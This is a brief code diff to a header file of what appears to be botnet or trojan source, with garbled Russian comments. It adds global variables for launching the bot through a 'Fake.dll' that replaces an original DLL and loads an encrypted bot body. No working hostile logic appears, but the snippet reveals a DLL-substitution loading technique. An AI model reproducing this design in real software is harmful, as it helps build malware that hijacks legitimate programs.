@@ -185,6 +185,11 @@ namespace BOT
 	//  системе уже запущен экземпл€р бота
 	//----------------------------------------------------
 	bool IsRunning();
+
+	//глобальные переменные дл€ хранени€ данных при запуске чере Fake.dll
+	extern char FakeDllPathBot[MAX_PATH]; //путь к шифрованному телу бота (bot.plug)
+	extern char FakeDllPathDll[MAX_PATH]; //путь к самой Fake.dll, ее заменена оригинальна€ dll
+	extern char FakeDllPathOrigDll[MAX_PATH]; //путь к оригинальной длл
 }
 
 //уид бота, инициализируетс€ в функции BOT::Initialize(), также мен€етс€ если будет изменен префикс 
